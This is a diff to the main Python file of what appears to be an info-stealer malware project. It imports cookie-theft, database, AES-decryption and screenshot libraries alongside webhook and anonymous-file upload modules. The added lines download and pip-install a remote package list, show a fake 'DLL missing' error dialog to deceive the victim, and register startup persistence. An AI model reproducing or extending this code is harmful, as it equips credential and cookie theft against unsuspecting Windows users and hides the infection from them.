@@ -7,40 +7,64 @@ import injection
 from config import Config
 from _roblox import RobloxX
 from anonFile import uploadToAnonfiles
-
-import getpass
-import os
-import random
-import re
-import shutil
-import socket
-import subprocess
-import threading
-import dhooks
-import requests
-import browser_cookie3
-from base64 import b64decode
-from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes
-from json import dumps
-from json import loads
-from json import loads as json_loads
-from sqlite3 import connect as sql_connect
-from sys import argv, executable
-from urllib.request import Request, urlopen
-from zipfile import ZipFile
-from Crypto.Cipher import AES
-from PIL import ImageGrab
-import platform
-import ctypes   
-
+from startup import StartUp
 ii = informations.Info()
 _webh = _webhook.WebhookX()
-cc = Config() 
+cc = Config()
+try:
+    import getpass
+    import platform
+    import ctypes
+    import os
+    import random
+    import re
+    import shutil
+    import socket
+    import subprocess
+    import threading
+    import dhooks
+    import requests
+    import psutil
+    import sys
+    import browser_cookie3
+    from base64 import b64decode
+    from ctypes import POINTER, Structure, byref, c_buffer, c_char, cdll, windll, wintypes
+    from json import dumps
+    from json import loads
+    from json import loads as json_loads
+    from sqlite3 import connect as sql_connect
+    from sys import argv, executable
+    from urllib.request import Request, urlopen
+    from zipfile import ZipFile
+    from Crypto.Cipher import AES
+    from PIL import ImageGrab
+    from tabulate import tabulate
+except Exception:
+    try:
+        import requests
+        import subprocess
+        import os
+    except Exception:
+        import subprocess
+        subprocess.run("python -m pip install requests", shell=True, check=True)
+    
+    import requests
+    requirementsurl = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/scrapedata/requirements.txt").text
+    spliee = requirementsurl.split()
+    
+    for split in spliee:
+        subprocess.run(f"python -m pip install {split}", shell=True, check=True)
+        subprocess.run("cls", shell=True, check=True)
+
 
 if platform.system() != "Windows":
-    exit()
+    sys.exit()
 
-ctypes.windll.user32.MessageBoxW(0, "The program can\'t start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
+if cc.get_fake_error() is True:
+    ctypes.windll.user32.MessageBoxW(0, "The program can't start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
+
+if cc.get_start_up() is True:
+    StartUp()
 
 
 def writeforfile(data, name):
